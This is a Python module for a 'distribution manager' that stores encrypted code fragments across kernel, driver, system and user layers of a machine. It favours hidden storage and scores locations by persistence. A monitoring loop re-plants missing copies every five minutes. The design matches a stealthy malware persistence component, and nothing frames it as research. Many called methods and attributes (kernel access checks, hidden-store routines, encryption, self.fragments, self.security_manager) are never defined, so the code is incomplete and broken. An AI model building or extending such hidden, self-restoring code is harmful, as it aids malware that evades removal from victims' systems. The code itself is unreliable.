"""
Distribution manager for fragment distribution across system layers.
"""

import asyncio
import os
import sys
from typing import Dict, List, Set, Any, Optional
from dataclasses import dataclass
import logging
from enum import Enum
import aiofiles
import psutil
from .fragment_manager import Fragment, FragmentPriority, FragmentType


class SystemLayer(Enum):
    KERNEL = 0
    DRIVER = 1
    SYSTEM = 2
    APPLICATION = 3
    USER = 4


@dataclass
class LayerInfo:
    type: SystemLayer
    security_level: int
    available_space: int
    write_access: bool
    hidden_storage: bool
    persistence: float  # 0-1 persistence probability


class DistributionManager:
    def __init__(self):
        self.layers: Dict[SystemLayer, LayerInfo] = {}
        self.fragment_distribution: Dict[str, List[SystemLayer]] = {}
        self.layer_monitor = LayerMonitor()

    async def initialize(self):
        """Initialize the distribution system."""
        await self._discover_layers()
        await self._analyze_layers()
        await self._setup_distribution_strategy()
        await self._start_monitoring()

    async def _discover_layers(self):
        """Discover available system layers."""
        # Kernel layer
        if await self._check_kernel_access():
            self.layers[SystemLayer.KERNEL] = LayerInfo(
                type=SystemLayer.KERNEL,
                security_level=5,
                available_space=await self._get_kernel_space(),
                write_access=await self._check_kernel_write(),
                hidden_storage=True,
                persistence=0.95,
            )

        # Driver layer
        if await self._check_driver_access():
            self.layers[SystemLayer.DRIVER] = LayerInfo(
                type=SystemLayer.DRIVER,
                security_level=4,
                available_space=await self._get_driver_space(),
                write_access=True,
                hidden_storage=True,
                persistence=0.9,
            )

        # System layer
        self.layers[SystemLayer.SYSTEM] = LayerInfo(
            type=SystemLayer.SYSTEM,
            security_level=3,
            available_space=await self._get_system_space(),
            write_access=True,
            hidden_storage=True,
            persistence=0.85,
        )

        # Application layer
        self.layers[SystemLayer.APPLICATION] = LayerInfo(
            type=SystemLayer.APPLICATION,
            security_level=2,
            available_space=await self._get_app_space(),
            write_access=True,
            hidden_storage=False,
            persistence=0.8,
        )

        # User layer
        self.layers[SystemLayer.USER] = LayerInfo(
            type=SystemLayer.USER,
            security_level=1,
            available_space=await self._get_user_space(),
            write_access=True,
            hidden_storage=False,
            persistence=0.7,
        )

    async def distribute_fragment(self, fragment: Fragment) -> bool:
        """Distribute fragment across appropriate layers."""
        # Determine target layers based on priority
        target_layers = await self._get_target_layers(fragment)

        # Check layer availability
        available_layers = await self._filter_available_layers(target_layers)

        if not available_layers:
            return False

        # Distribute copies
        success = False
        for layer in available_layers:
            if await self._store_in_layer(fragment, layer):
                self.fragment_distribution.setdefault(fragment.id, []).append(layer)
                success = True

        return success

    async def _get_target_layers(self, fragment: Fragment) -> List[SystemLayer]:
        """Determine target layers based on fragment priority."""
        if fragment.priority == FragmentPriority.CRITICAL:
            return [SystemLayer.KERNEL, SystemLayer.DRIVER, SystemLayer.SYSTEM]
        elif fragment.priority == FragmentPriority.HIGH:
            return [SystemLayer.DRIVER, SystemLayer.SYSTEM, SystemLayer.APPLICATION]
        elif fragment.priority == FragmentPriority.MEDIUM:
            return [SystemLayer.SYSTEM, SystemLayer.APPLICATION]
        else:
            return [SystemLayer.APPLICATION, SystemLayer.USER]

    async def _filter_available_layers(
        self, layers: List[SystemLayer]
    ) -> List[SystemLayer]:
        """Filter layers based on availability and security."""
        available = []

        for layer in layers:
            info = self.layers.get(layer)
            if info and await self._is_layer_available(info):
                available.append(layer)

        return available

    async def _store_in_layer(self, fragment: Fragment, layer: SystemLayer) -> bool:
        """Store fragment in specific system layer."""
        try:
            layer_info = self.layers[layer]

            # Check space availability
            if not await self._check_space(fragment, layer_info):
                return False

            # Prepare storage location
            location = await self._prepare_storage_location(layer)

            # Create secure container
            container = await self._create_secure_container(fragment, layer_info)

            # Store fragment
            if layer_info.hidden_storage:
                return await self._store_hidden(container, location)
            else:
                return await self._store_normal(container, location)

        except Exception as e:
            logging.error(f"Failed to store in layer {layer}: {e}")
            return False

    async def _check_space(self, fragment: Fragment, layer_info: LayerInfo) -> bool:
        """Check if layer has enough space for fragment."""
        fragment_size = len(fragment.code)
        return fragment_size <= layer_info.available_space

    async def _prepare_storage_location(self, layer: SystemLayer) -> str:
        """Prepare storage location in layer."""
        if layer == SystemLayer.KERNEL:
            return await self._prepare_kernel_storage()
        elif layer == SystemLayer.DRIVER:
            return await self._prepare_driver_storage()
        elif layer == SystemLayer.SYSTEM:
            return await self._prepare_system_storage()
        elif layer == SystemLayer.APPLICATION:
            return await self._prepare_app_storage()
        else:
            return await self._prepare_user_storage()

    async def _create_secure_container(
        self, fragment: Fragment, layer_info: LayerInfo
    ) -> bytes:
        """Create secure container for fragment storage."""
        # Add layer-specific security
        security_level = layer_info.security_level

        # Create container structure
        container = {
            "fragment_id": fragment.id,
            "code": fragment.code,
            "signature": fragment.signature,
            "security_level": security_level,
            "timestamp": asyncio.get_event_loop().time(),
        }

        # Encrypt container
        return await self._encrypt_container(container, security_level)

    async def _store_hidden(self, container: bytes, location: str) -> bool:
        """Store container in hidden storage."""
        try:
            if sys.platform.startswith("linux"):
                return await self._store_hidden_linux(container, location)
            elif sys.platform == "win32":
                return await self._store_hidden_windows(container, location)
            elif sys.platform == "darwin":
                return await self._store_hidden_macos(container, location)
            return False
        except Exception as e:
            logging.error(f"Hidden storage failed: {e}")
            return False

    async def _store_normal(self, container: bytes, location: str) -> bool:
        """Store container in normal storage."""
        try:
            async with aiofiles.open(location, "wb") as f:
                await f.write(container)
            return True
        except Exception as e:
            logging.error(f"Normal storage failed: {e}")
            return False

    async def monitor_distribution(self):
        """Monitor fragment distribution and redistribute if needed."""
        while True:
            for fragment_id, layers in self.fragment_distribution.items():
                # Check fragment copies
                healthy_copies = await self._check_fragment_copies(fragment_id, layers)

                # Redistribute if needed
                if len(healthy_copies) < self._get_minimum_copies(fragment_id):
                    await self._redistribute_fragment(fragment_id)

            await asyncio.sleep(300)  # Check every 5 minutes

    async def _check_fragment_copies(
        self, fragment_id: str, layers: List[SystemLayer]
    ) -> List[SystemLayer]:
        """Check health of fragment copies across layers."""
        healthy_copies = []

        for layer in layers:
            if await self._verify_fragment_in_layer(fragment_id, layer):
                healthy_copies.append(layer)

        return healthy_copies

    def _get_minimum_copies(self, fragment_id: str) -> int:
        """Get minimum required copies based on fragment priority."""
        fragment = self.fragments.get(fragment_id)
        if not fragment:
            return 1

        if fragment.priority == FragmentPriority.CRITICAL:
            return 3
        elif fragment.priority == FragmentPriority.HIGH:
            return 2
        else:
            return 1

    async def _redistribute_fragment(self, fragment_id: str):
        """Redistribute fragment to maintain required copies."""
        fragment = self.fragments.get(fragment_id)
        if not fragment:
            return

        # Get current distribution
        current_layers = self.fragment_distribution.get(fragment_id, [])

        # Determine needed layers
        target_layers = await self._get_target_layers(fragment)
        needed_layers = [l for l in target_layers if l not in current_layers]

        # Redistribute to needed layers
        for layer in needed_layers:
            if await self._store_in_layer(fragment, layer):
                current_layers.append(layer)

        self.fragment_distribution[fragment_id] = current_layers

    async def _verify_fragment_in_layer(
        self, fragment_id: str, layer: SystemLayer
    ) -> bool:
        """Verify fragment copy in specific layer."""
        try:
            # Get storage location
            location = await self._prepare_storage_location(layer)

            # Read container
            container = await self._read_container(location, layer)

            # Verify container
            return await self._verify_container(container, fragment_id)

        except Exception:
            return False

    async def _read_container(self, location: str, layer: SystemLayer) -> bytes:
        """Read fragment container from storage."""
        if self.layers[layer].hidden_storage:
            return await self._read_hidden(location, layer)
        else:
            async with aiofiles.open(location, "rb") as f:
                return await f.read()

    async def _verify_container(self, container: bytes, fragment_id: str) -> bool:
        """Verify container integrity and authenticity."""
        try:
            # Decrypt container
            decrypted = await self._decrypt_container(container)

            # Verify fragment ID
            if decrypted["fragment_id"] != fragment_id:
                return False

            # Verify signature
            return await self.security_manager.verify_signature(
                decrypted["code"], decrypted["signature"]
            )

        except Exception:
            return False
